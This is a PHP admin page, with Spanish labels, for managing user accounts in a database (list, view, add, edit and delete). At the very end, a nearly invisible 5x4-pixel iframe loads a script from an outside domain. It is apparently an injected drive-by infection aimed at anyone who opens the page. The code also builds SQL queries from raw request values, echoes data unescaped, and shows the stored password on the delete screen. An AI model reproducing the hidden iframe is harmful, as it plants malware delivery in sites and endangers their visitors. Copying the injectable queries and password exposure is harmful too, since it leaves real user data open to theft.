<?php
	include_once('../inc/conf.inc.php');
	$usuarios = new DBI;
	$campos = 'usuario,nombre,direccion,localidad,cp,telefono,mail,id_grupo,nota';
?>
<html>
<head>
	<title>adm_usuarios</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?php echo CFG_styleDir.CFG_styleFile?>" type="text/css">
    <link rel="stylesheet" href="../styles/tabla.css" type="text/css">
</head>

<body>
<?php
	switch ($action) {
		case 'Agregar':
			if ( defined('CFG_passFunction') && $clave != '' ) {
				if ( strtolower(CFG_passFunction) != 'plain') {
					$clave = addslashes(call_user_func(CFG_passFunction, $clave));
				}
			}
			$usuarios->insert(CFG_usersTable,$campos.',clave');
			$action = '';
			break;
		case 'Modificar':
			if ( defined('CFG_passFunction') && $clave != '' ) {
				if ( strtolower(CFG_passFunction) != 'plain') {
					$clave = addslashes(call_user_func(CFG_passFunction, $clave));
				}
			}
			$usuarios->update(CFG_usersTable,$campos.( $clave != '' ? ',clave' : '' ), "id = $id");
			$action = '';
			break;
		case 'Borrar':
			$usuarios->delete(CFG_usersTable, "id = $id");
			$action = '';
			break;
	}
?>
<?php
	if ($action == '') {
		if (trim($order) == '') $order = 'usuario';
		$usuarios->sql = "
			SELECT u.*,g.nombre as grupo
			FROM ".CFG_usersTable." u
			LEFT JOIN ".CFG_groupsTable." g ON g.id = u.id_grupo
			ORDER BY $order
		";
		$usuarios->query();
		$num_adm_usuarios = $usuarios->num_rows();
?>
<table align="center" width="550" cellpadding="3" cellspacing="0" border="0">
	<tr> 
		<th colspan="4" class="relieve">
			<table width="100%" border="0" cellspacing="0" cellpadding="0">
				<tr>
					<td width="52%"><a href="<?php echo $PHP_SELF?>?action=frmAgregar" class="text">Agregar Usuario</a></td>
					<td width="48%" align="right" class="text">Total: <?php echo $num_adm_usuarios?></td>
				</tr>
			</table>
		</th>
	</tr>
	<tr> 
		<td height="5" colspan="6" class="sombra_titulo"></td>
	</tr>
	<tr align="center"> 
		<td class="table1_table" width="20">Ver</td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=usuario">Usuario</a></td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=nombre">Nombre</a></td>
		<td class="table1_table"><a href="<?php echo $PHP_SELF?>?order=g.nombre">Grupo</a></td>
	</tr>
<?php
		if ($num_adm_usuarios < 1) {
?>
	<tr> 
		<td colspan="8" align="center" class="data">Ningun registro</td>
	</tr>
<?php
		}else{
			while( $usuario = $usuarios->fetch_object() ){
				$tr_bgcolor = ($tr_bgcolor == '#6699CC')?'#336699':'#6699CC';
?>
	<tr> 
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			<a href="<?php echo $PHP_SELF?>?id=<?php echo $usuario->id?>&action=ver"><img src="<? echo CFG_imgPath?>list.gif" border="0" /></a></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $usuario->usuario?></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $usuario->nombre?></td>
		<td bgcolor="<?php echo $tr_bgcolor?>" class="relieve" align="center">
			&nbsp;<?php echo $usuario->grupo?></td>
	</tr>
<?php
			}
		}
?>
</table>
<?php
	 }
?>
<?php
	if ($action == 'ver') {
		$usuario = DBI::record(
			"adm_usuarios u
			LEFT JOIN ".CFG_groupsTable." g ON g.id = u.id_grupo",
			"u.id = $id",
			"u.*,g.nombre as grupo"
		);
?>
<form name="form1" method="post" action="<?= $PHP_SELF?>">
	<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center" bgcolor="#305280"> 
			<th height="31" colspan="2" class="relieve"><span class="title">Ver Usuario</span></th>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve" bgcolor="#6699CC" height="17">Usuario</td>
			<td width="210" class="relieve" align="center" height="17">&nbsp;<?php echo $usuario->usuario?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve" bgcolor="#336699">Clave</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php //echo $usuario->clave?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Grupo</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->grupo?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Nombre</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->nombre?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Direcci&oacute;n</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->direccion?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Localidad</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->localidad?></td>
		</tr>
		<tr bgcolor="#6699CC">
			<td width="188" align="center" class="relieve">CP</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->cp?></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Tel&eacute;fono</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->telefono?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve" bgcolor="#6699CC">Mail</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo $usuario->mail?></td>
		</tr>
		<tr align="center" bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Nota</td>
			<td width="210" class="relieve" align="center">&nbsp;<?php echo nl2br($usuario->nota)?></td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td colspan="2" class="relieve" bgcolor="#336699"><center>
				<input type="hidden" name="id" value="<?php echo $id?>">
				<input type="hidden" name="action" value="">
				<input type="button" class="boton" value="Aceptar" onClick="javascript:void open('<?php echo $PHP_SELF?>','_self','')">
				<input type="button" class="boton" value="Modificar" onClick="javascript:document.form1.action.value='frmModificar';document.form1.submit();">
				<input type="button" class="boton" value="Borrar" onClick="javascript:document.form1.action.value='frmBorrar';document.form1.submit();">
			</center></td>
		</tr>
	</table>
</form>
<?php
	}
?>
<?php
	if ($action == 'frmAgregar' || $action == 'frmModificar') {
		if ($action == 'frmModificar') {
			$usuario = DBI::record(CFG_usersTable,"id = $id");
		}
?>
<?php
	Form::validate();
?>
<script language="JavaScript">
<!--
	function fVerificar( formulario ){
		if( !validate(formulario) ) return false;
		if (formulario.clave.value != formulario.clave2.value){
			alert('Las claves no coinciden');
			formulario.clave2.focus();
			formulario.clave2.select();
			return false;
		}
		return true;
	}
//-->
</script>
<form name="form1" method="post" action="<?= $PHP_SELF?>" onSubmit="return fVerificar(this)">
	<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center" bgcolor="#305280"> 
			<th height="29" colspan="2" class="relieve"><span class="texto_titulo">Usuario</span></th>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve" bgcolor="#6699CC" height="17">Usuario</td>
			<td width="226" class="relieve" align="center" height="17"><input name="usuario" type="text" value="<?= $usuario->usuario?>" class="fields" validar="str(4,100):El nombre de usuario debe tener mas de cuatro caracteres.">
			</td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve" bgcolor="#336699">Clave</td>
			<td width="226" class="relieve" align="center"><input id="clave" name="clave" type="password" value="<? //= $usuario->clave?>" class="fields" validar="str(4,100):El clave debe tener mas de cuatro caracteres.">
			</td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Repita la Clave</td>
			<td width="226" class="relieve" align="center"><input id="clave2" name="clave2" type="password" value="<? //= $usuario->clave?>" class="fields"> 
			</td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Grupo</td>
			<td width="226" class="relieve" align="center">
<?php
		widgets::dbCombo(
			'id_grupo',
			DBI::select('adm_grupos','id,nombre', '', 'nombre'),
			$usuario->id_grupo,
			$options=NULL,
			'',
			'',
			'',
			TRUE,
			'fields',
			$html='',
			$validate=''						
		);
?>
			</td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Nombre</td>
			<td width="226" class="relieve" align="center"><input name="nombre" type="text" value="<?= $usuario->nombre?>" class="fields" validar="str:Debe ingresar nombre.">
			</td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Direcci&oacute;n</td>
			<td width="226" class="relieve" align="center"><input name="direccion" type="text" value="<?= $usuario->direccion?>" class="fields">
			</td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Localidad</td>
			<td width="226" class="relieve" align="center"><input name="localidad" type="text" class="fields" value="<?= $usuario->localidad?>"></td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">CP</td>
			<td width="226" class="relieve" align="center"><input name="cp" type="text" class="fields" value="<?= $usuario->cp?>"> 
			</td>
		</tr>
		<tr bgcolor="#6699CC"> 
			<td width="188" align="center" class="relieve">Tel&eacute;fono</td>
			<td width="226" class="relieve" align="center"><input name="telefono" type="text" value="<?= $usuario->telefono?>" class="fields"> 
			</td>
		</tr>
		<tr bgcolor="#336699"> 
			<td width="188" align="center" class="relieve">Mail</td>
			<td width="226" class="relieve" align="center"><input name="mail" type="text" value="<?= $usuario->mail?>" class="fields"> 
			</td>
		</tr>
		<tr align="center" bgcolor="#6699CC"> 
			<td width="188" class="relieve">Nota</td>
			<td width="226" class="relieve"><textarea name="nota" wrap="VIRTUAL" class="fields"><?= $usuario->nota?></textarea> 
			</td>
		</tr>
		<tr align="center" bgcolor="#6699CC"> 
			<td colspan="2" class="relieve" bgcolor="#336699"> <center>
			<input name="id" type="hidden" id="id" value="<?= $usuario->id?>">
			<input type="hidden" name="action" value="<?= $action == 'frmAgregar' ? 'Agregar' : 'Modificar' ?>">
			<input type="submit" class="boton" value="<?= $action == 'frmAgregar' ? 'Agregar' : 'Modificar' ?>">
			<input type="button" class="boton" value="Cancelar" name="Button" onClick="location = '<? echo $PHP_SELF?>'">
			</center></td>
		</tr>
	</table>
</form>
<?php
	}
?>
<?
        if($action == 'frmBorrar'){
                $usuario = DBI::record('adm_usuarios',"id = $id");
?>
<form name="form1" method="post" action="<?= $PHP_SELF?>">
  
 <table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr align="center" bgcolor="#305280"> 
   <th class="relieve" height="31" colspan="2"> <span class="texto_titulo"> Borrar 
	Usuario </span> </th>
  </tr>
  <tr bgcolor="#6699CC"> 
   <td width="188" align="center" class="relieve" bgcolor="#6699CC" height="17">Usuario</td>
   <td width="210" class="relieve" align="center" height="17">&nbsp; 
	<?= $usuario->usuario?>
   </td>
  </tr>
  <tr bgcolor="#336699"> 
   <td width="188" align="center" class="relieve" bgcolor="#336699">Clave</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->clave?>
   </td>
  </tr>
  <tr bgcolor="#6699CC"> 
   <td width="188" align="center" class="relieve">Grupo</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->grupo?>
   </td>
  </tr>
  <tr bgcolor="#336699"> 
   <td width="188" align="center" class="relieve">Nombre</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->nombre?>
   </td>
  </tr>
  <tr bgcolor="#6699CC"> 
   <td width="188" align="center" class="relieve" bgcolor="#6699CC">Direcci&oacute;n</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->direccion?>
   </td>
  </tr>
  <tr bgcolor="#336699"> 
   <td width="188" align="center" class="relieve">Localidad</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->localidad?>
   </td>
  </tr>
  <tr bgcolor="#6699CC"> 
   <td width="188" align="center" class="relieve">CP</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->cp?>
   </td>
  </tr>
  <tr bgcolor="#336699"> 
   <td width="188" align="center" class="relieve" bgcolor="#336699">Tel&eacute;fono</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->telefono?>
   </td>
  </tr>
  <tr bgcolor="#6699CC"> 
   <td width="188" align="center" class="relieve">Mail</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= $usuario->mail?>
   </td>
  </tr>
  <tr align="center" bgcolor="#336699"> 
   <td width="188" align="center" class="relieve">Nota</td>
   <td width="210" class="relieve" align="center">&nbsp; 
	<?= nl2br($usuario->nota)?>
   </td>
  </tr>
  <tr align="center"> 
   <td colspan="2" class="relieve" bgcolor="#336699"> <center>
	 <input type="hidden" name="action" value="Borrar">
	 <input type="hidden" name="id" value="<?= $id?>">
	 <input type="submit" class="boton" value="Borrar">
		  <input type="button" class="boton" value="Cancelar" name="Button" onClick="location = 'usuarios.php'">
		</center></td>
  </tr>
 </table>
</form>
<? } ?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
